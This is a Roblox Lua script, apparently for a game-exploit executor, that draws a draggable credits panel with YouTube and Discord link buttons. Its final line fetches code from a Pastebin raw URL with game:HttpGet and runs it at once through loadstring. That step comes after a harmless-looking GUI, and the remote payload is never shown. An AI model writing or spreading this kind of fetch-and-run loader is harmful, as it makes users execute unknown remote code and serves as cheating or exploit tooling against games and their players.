local player = game:GetService("Players").LocalPlayer
local TweenService = game:GetService("TweenService")

local gui = Instance.new("ScreenGui")
gui.Name = "EligantExploitGui"
gui.Parent = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 200)
frame.Position = UDim2.new(0.5, -175, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = gui

local bg = Instance.new("ImageLabel")
bg.Size = UDim2.new(1,0,1,0)
bg.Position = UDim2.new(0,0,0,0)
bg.BackgroundTransparency = 1
bg.Image = "93418379039111"
bg.ScaleType = Enum.ScaleType.Crop
bg.Parent = frame

local mask = Instance.new("Frame")
mask.Size = UDim2.new(1,0,1,0)
mask.Position = UDim2.new(0,0,0,0)
mask.BackgroundColor3 = Color3.fromRGB(0,0,0)
mask.BackgroundTransparency = 0.25
mask.BorderSizePixel = 0
mask.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 20, 0, 10)
title.BackgroundTransparency = 1
title.Text = "By: Eligant"
title.TextColor3 = Color3.fromRGB(240,200,255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = frame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -40, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 100)
closeBtn.Text = "×"
closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextScaled = true
closeBtn.AutoButtonColor = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,6)
corner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
	frame:Destroy()
end)

closeBtn.Parent = frame

local function makeDraggable(f, handle)
	handle = handle or f
	local UIS = game:GetService("UserInputService")
	local dragging, dragStart, startPos
	local function update(input)
		local delta = input.Position - dragStart
		f.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	handle.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = f.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	handle.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
			update(input)
		end
	end)
end

makeDraggable(frame, title)

local function createButton(text, color, pos, link)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, 140, 0, 40)
	btn.Position = pos
	btn.Text = text
	btn.TextColor3 = Color3.fromRGB(255,255,255)
	btn.BackgroundColor3 = color
	btn.Font = Enum.Font.GothamBold
	btn.TextScaled = true
	btn.Parent = frame

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0,8)
	corner.Parent = btn

	btn.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard(link)
		end
		error("Link copied")
	end)

	local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
	local goal = {BackgroundColor3 = color:Lerp(Color3.fromRGB(255,255,255), 0.2)}
	local tween = TweenService:Create(btn, tweenInfo, goal)
	tween:Play()
end

createButton("Youtube", Color3.fromRGB(180,30,50), UDim2.new(0, 40, 0, 100), "https://www.youtube.com/@MixalamsLams")
createButton("Discord", Color3.fromRGB(50,30,180), UDim2.new(0, 200, 0, 100), "https://discord.com/channels/@me/1288262049151057941")

local tweenInfo = TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
local goal = {BackgroundColor3 = Color3.fromRGB(255,80,150)}
local tween = TweenService:Create(closeBtn, tweenInfo, goal)
tween:Play()



loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()


